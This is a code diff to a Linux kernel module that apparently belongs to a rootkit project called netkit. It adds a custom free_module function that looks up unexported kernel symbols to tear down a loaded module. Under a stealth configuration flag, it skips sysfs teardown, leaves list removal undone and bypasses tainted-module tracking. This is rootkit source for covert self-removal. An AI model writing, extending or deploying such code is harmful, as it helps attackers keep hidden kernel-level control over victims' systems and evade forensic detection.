@@ -3,6 +3,7 @@
 #include <linux/module.h>
 #include <linux/sched/signal.h>
 #include <linux/kthread.h>
+#include <linux/kernel.h>
 #include <linux/fcntl.h>
 #include <linux/fs.h>
 
@@ -10,6 +11,7 @@
 
 #include "symbol.h"
 #include "debug.h"
+#include "../netkit.h"
 
 static struct task_struct *get_task_by_name(const char *name)
 {
@@ -74,6 +76,84 @@ static int try_stop_module(struct module *mod, int flags, int *forced)
 	return 0;
 }
 
+static void free_module(struct module *mod)
+{
+    struct mutex *module_mutex;
+    void (*module_arch_cleanup)(struct module*);
+    void (*module_unload_free)(struct module*);
+    void (*mod_tree_remove)(struct module*);
+    void (*module_arch_freeing_init)(struct module*);
+    void (*destroy_params)(struct kernel_param*, unsigned);
+    void (*module_bug_cleanup)(struct module*);
+    void (*do_exit)(long);
+
+	// leave out:
+	// - trace_module_free (function not found)
+	// - mod_sysfs_teardown (function already called)
+	// - live patch code (this is not live patch code)
+	// - deletion from module list (already called)
+	// - try_add_tained_module (a lot of ugly code reuse)
+	// **** free_mod_mem(mod) **** (causes bug(), but this will cause memory to keep existing)
+
+#if (!CONFIG_NETKIT_STEALTH)
+    void (*mod_sysfs_teardown)(struct module*);
+
+    mod_sysfs_teardown = (void (*)(struct module*))sym_lookup("mod_sysfs_teardown");
+	mod_sysfs_teardown(mod);
+#endif
+
+    module_mutex = (struct mutex*)sym_lookup("module_mutex");
+
+	/*
+	 * We leave it in list to prevent duplicate loads, but make sure
+	 * that noone uses it while it's being deconstructed.
+	 */
+	mutex_lock(module_mutex);
+	mod->state = MODULE_STATE_UNFORMED;
+	mutex_unlock(module_mutex);
+
+	/* Arch-specific cleanup. */
+	module_arch_cleanup = (void (*)(struct module*))sym_lookup("module_arch_cleanup");
+	module_arch_cleanup(mod);
+
+	/* Module unload stuff */
+	module_unload_free = (void (*)(struct module*))sym_lookup("module_unload_free");
+	module_unload_free(mod);
+
+	/* Free any allocated parameters. */
+	destroy_params = (void (*)(struct kernel_param*, unsigned))sym_lookup("destroy_params");
+	destroy_params(mod->kp, mod->num_kp);
+
+	/* Now we can delete it from the lists */
+	mutex_lock(module_mutex);
+	/* Unlink carefully: kallsyms could be walking list. */
+	
+#if (!CONFIG_NETKIT_STEALTH)
+	list_del_rcu(&mod->list);
+#endif
+
+	mod_tree_remove = (void (*)(struct module*))sym_lookup("mod_tree_remove");
+	mod_tree_remove(mod);
+
+	/* Remove this module from bug list, this uses list_del_rcu */
+	module_bug_cleanup = (void (*)(struct module*))sym_lookup("module_bug_cleanup");
+	module_bug_cleanup(mod);
+	/* Wait for RCU-sched synchronizing before releasing mod->list and buglist. */
+	synchronize_rcu();
+	//if (try_add_tainted_module(mod))
+	//	pr_err("%s: adding tainted module to the unloaded tainted modules list failed.\n", mod->name);
+	mutex_unlock(module_mutex);
+
+	/* This may be empty, but that's OK */
+	module_arch_freeing_init = (void (*)(struct module*))sym_lookup("module_arch_freeing_init");
+	module_arch_freeing_init(mod);
+	kfree(mod->args);
+	free_percpu(mod->percpu);
+
+	do_exit = (void (*)(long))sym_lookup("do_exit");
+	do_exit(0);
+}
+
 /*
  * this code is pretty much destroy_module, but recoded to avoid userland mem
  * if there's a workaround to allocate userland mem, please implement
@@ -85,7 +165,6 @@ int module_stop(void* data)
     struct mutex *module_mutex;
 	struct module *mod = (struct module*)data;
 	void (*async_synchronize_full)(void);
-	void (*free_module)(struct module*);
     int forced;
     int retv = 0;
 
@@ -121,7 +200,7 @@ int module_stop(void* data)
 
 	// pagefaults, so this does not return
 	NETKIT_LOG("[*] freeing...\n");
-	free_module = (void (*)(struct module*))sym_lookup("free_module");
+	//free_module = (void (*)(struct module*))sym_lookup("free_module");
 	free_module(mod);
 
 	// implement this in ASM (or C lol):
